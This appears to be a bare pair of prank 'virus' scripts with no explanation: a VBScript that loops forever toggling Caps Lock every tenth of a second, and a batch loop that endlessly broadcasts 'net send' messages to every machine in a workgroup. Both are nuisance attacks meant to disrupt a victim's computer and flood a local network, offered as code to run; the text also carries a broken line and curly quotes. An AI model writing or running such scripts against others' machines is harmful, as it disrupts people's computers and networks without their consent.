
Set wshShell =wscript.CreateObject(“WScript.Shel
l”)
do
wscript.sleep 100
wshshell.sendkeys “{CAPSLOCK}”
loop


:CRASH
net send * WORKGROUP ENABLED
net send * WORKGROUP ENABLED
GOTO CRASH

